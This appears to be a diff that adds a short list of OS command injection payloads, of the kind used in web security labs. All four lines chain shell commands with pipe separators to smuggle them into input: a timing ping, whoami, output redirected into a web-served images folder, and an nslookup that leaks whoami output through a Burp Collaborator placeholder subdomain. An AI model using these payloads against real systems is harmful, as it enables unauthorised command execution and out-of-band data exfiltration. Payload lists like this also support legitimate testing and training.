@@ -1,0 +1,4 @@
+||ping+-c+10+127.0.0.1||
+|whoami
+||whoami>/var/www/images/output.txt||
+||nslookup+`whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net||
